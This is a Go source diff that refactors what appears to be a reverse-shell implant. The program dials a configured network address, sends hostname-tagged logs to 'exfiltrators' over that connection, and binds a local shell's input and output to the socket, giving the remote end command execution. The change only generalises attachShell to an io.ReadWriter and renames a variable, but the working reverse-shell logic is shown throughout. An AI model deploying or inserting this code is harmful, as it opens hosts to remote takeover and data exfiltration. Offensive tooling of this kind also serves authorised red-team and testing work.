@@ -2,6 +2,7 @@ package main
 
 import (
 	"fmt"
+	"io"
 	"log"
 	"net"
 	"os"
@@ -43,12 +44,12 @@ func determineShellCommand(prioritizedChoices [][]string) (shell string, args []
 	return "", nil, fmt.Errorf("could not find any existing shell binary")
 }
 
-func attachShell(con net.Conn, shellBinary string, args ...string) error {
+func attachShell(rw io.ReadWriter, shellBinary string, args ...string) error {
 	cmd := exec.Command(shellBinary, args...)
 	cmd.SysProcAttr = getSysProcAttr()
-	cmd.Stdin = con
-	cmd.Stdout = con
-	cmd.Stderr = con
+	cmd.Stdin = rw
+	cmd.Stdout = rw
+	cmd.Stderr = rw
 
 	err := cmd.Start()
 	if err != nil {
@@ -65,6 +66,7 @@ func attachShell(con net.Conn, shellBinary string, args ...string) error {
 
 func main() {
 	timeout := 3 * time.Second
+
 	if exfilTimeout != "" {
 		dt, err := time.ParseDuration(exfilTimeout)
 		if err == nil {
@@ -73,6 +75,7 @@ func main() {
 	}
 
 	w, errs := exfilwriter.New(exfilCfg, timeout)
+
 	hostname, err := os.Hostname()
 	if err != nil {
 		hostname = "unknown"
@@ -80,14 +83,14 @@ func main() {
 
 	log := log.New(w, fmt.Sprintf("%s: ", hostname), 0)
 
-	conn, err := net.Dial(network, address)
+	con, err := net.Dial(network, address)
 	if err != nil {
 		log.Fatal(err.Error())
 	}
 
-	defer conn.Close()
+	defer con.Close()
 
-	w.AddExfiltrator(conn)
+	w.AddExfiltrator(con)
 
 	// send out debuglog configuration errors *at least* over TCP
 	if len(errs) > 0 {
@@ -103,7 +106,7 @@ func main() {
 
 	log.Printf("Using Shell: %s\n", shellBinary)
 
-	err = attachShell(conn, shellBinary, args...)
+	err = attachShell(con, shellBinary, args...)
 	if err != nil {
 		log.Fatal(err)
 	}
